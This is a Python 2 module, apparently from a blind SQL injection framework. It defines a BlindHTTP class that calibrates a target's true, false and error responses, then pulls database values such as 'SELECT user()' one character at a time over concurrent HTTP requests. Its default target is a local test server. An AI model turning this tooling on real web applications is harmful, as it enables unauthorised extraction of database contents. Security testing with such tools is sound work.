from .query import Query
from .requester import *
from .technique import *
from .truth import *
from .pretty_print import PrettyTable

from urllib import quote


class BlindHTTP:
	comparison_attrs = {\
		"content":LooseTextTruth,\
		"text":LooseTextTruth,\
		"size":LooseNumericTruth,\
		"response_time":LooseNumericTruth\
	}
	opposite_comparators = {"<":">",">":"<","=":"!=","!=":"="}
	#old query: Query("foo=${user_query:unimportant}&row_index=${row_index:1}&char_index=${char_index:0}&test_char=${char_val:0}&cmp=${comparator:>}&sleep=${sleep:0}",encoder=quote)
	def __init__(self,\
			url   				= Query('http://127.0.0.1:8090/boolean?${query}'),\
			method 				= 'GET',\
			query 				= Query("row_index=${row_index:1}&character_index=${char_index:1}&character_value=${char_val:0}&comparator=${comparator:>}&sleep=${sleep:0}&foo=${user_query:unimportant}",encoder=quote),\
			comparison_attr 	= "size",\
			acceptable_deviation= 1,\
			base_requests 		= 5, *args,**kwargs):

		#setup the queries
		self.url = url
		self.query = query

		#build a Requester object. You can pass this any args that you would pass to requests.Request
		self.requester = HTTPRequester(url = self.url, method = method, *args, **kwargs)

		#build a Truth class
		self.truth = self.comparison_attrs[comparison_attr](comparison_attr = comparison_attr,acceptable_deviation = acceptable_deviation)

		#the queries default options should evaluate to True in whatever application we are testing. If we flip the comparator it should evauluate to false. 
		#here, we figure out what the opposite comparator is.
		opp_cmp = self.opposite_comparators[query.get_option('comparator')]

		#setup some base values
		for i in xrange(base_requests):
		    self.truth.add_true((self.requester.make_request(query.render())))
		self.query.set_option('comparator',opp_cmp)
		for i in xrange(base_requests):
		    self.truth.add_false((self.requester.make_request(query.render())))
		self.query.set_option('char_index','1000')
		for i in xrange(base_requests):
		    self.truth.add_error((self.requester.make_request(query.render())))


	def run(self,query='SELECT user()',sleep=0,concurrency=50):
		#build our technique
		tech = BlindTechniqueConcurrent(make_request_func=self.requester.make_request,query=self.query, truth=self.truth)
		
		#setup a PrettyTable for curses like printing
		pretty_table = PrettyTable(get_table_callback=tech.get_results,update=.1,row_filter=lambda row:len(row) > 1)
		
		#run our technique
		techgl = tech.run( user_query = query ,sleep = sleep,concurrency = concurrency)

		#start printing the tables
		pretty_table.start()

		#wait for the technique to finish
		techgl.join()

		#kill the pretty tables
		pretty_table.die()

		print tech.get_results()
